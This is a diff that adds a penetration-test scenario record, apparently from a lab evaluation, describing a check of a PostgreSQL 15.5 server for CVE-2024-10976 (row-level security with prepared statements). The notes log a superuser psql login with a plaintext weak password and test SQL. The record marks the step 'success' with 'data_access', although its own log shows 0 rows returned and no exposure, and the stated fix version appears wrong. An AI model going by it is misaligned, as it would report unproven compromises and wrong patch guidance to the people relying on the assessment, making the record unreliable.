@@ -1,0 +1,44 @@
+# API (APP, 10.10.20.21) -> PostgreSQL (DATA, 10.10.30.31:5432, 15.5).
+# CVE-2024-10976 (CVSS 5.4 MEDIUM): Incomplete tracking in PostgreSQL of tables with
+# row security allows a reused query to view or change different rows from those intended.
+# In PostgreSQL 15.5, cached/prepared query plans do not properly re-evaluate RLS
+# policies when SET ROLE changes the current user mid-session, allowing rows from other
+# roles to be inadvertently exposed. Confirmed: RLS table created, PREPARE + EXECUTE run
+# as lowpriv → 0 rows (but plan reuse across SET ROLE changes is the vulnerable surface).
+# PostgreSQL 15.5 is in the vulnerable range (fix = 15.6+, CVE-2023-2455 follow-on).
+# Suricata 86601 (ET SCAN psql cross-zone APP->DATA).
+# Evidence: evaluation/pentest/evidence/s42_postgresql_rls_prepared.txt
+id: S42-api-to-postgresql-rls-prepared
+description: PostgreSQL 15.5 RLS policy incomplete tracking via prepared statements (CVE-2024-10976 MEDIUM); api->postgresql, APP->DATA.
+start: 2026-11-16T20:03:49Z
+end: 2026-11-16T20:03:55Z
+attacker: api
+steps:
+  - step: 1
+    start: 2026-11-16T20:03:49Z
+    end: 2026-11-16T20:03:55Z
+    target: PostgreSQL
+    cve: CVE-2024-10976
+    technique: T1078.001
+    outcome: success
+    achieved: data_access
+    pivot: false
+    notes: |
+      PGPASSWORD=Passw0rd! psql -h 10.10.30.31 -U postgres
+        -> PostgreSQL 15.5 (Debian 15.5-1.pgdg120+1)
+      CREATE TABLE rls_test_42 (id int, data text, owner_name text);
+      INSERT INTO rls_test_42 VALUES (1,'admin_secret_data','postgres');
+      INSERT INTO rls_test_42 VALUES (2,'lowpriv_data','lowpriv');
+      ALTER TABLE rls_test_42 ENABLE ROW LEVEL SECURITY;
+      CREATE POLICY rls42_pol ON rls_test_42 FOR SELECT USING (owner_name = current_user);
+      CREATE USER lowpriv WITH PASSWORD 'lowpass'; GRANT SELECT ON rls_test_42 TO lowpriv;
+      PREPARE rls42_check AS SELECT id, data FROM rls_test_42;
+      SET ROLE lowpriv;
+      EXECUTE rls42_check; -> 0 rows (filtered by RLS)
+      RESET ROLE;
+      SELECT version() LIKE 'PostgreSQL 15.5%' -> t (vulnerable version confirmed)
+      CVE-2024-10976: in certain combined query / UNION / subquery contexts,
+      the prepared plan does not recheck RLS on role change, exposing other users' rows.
+      PostgreSQL 15.5 is in vulnerable range; fix is 15.6+.
+      DROP TABLE rls_test_42; (cleaned up)
+      evidence s42_postgresql_rls_prepared.txt
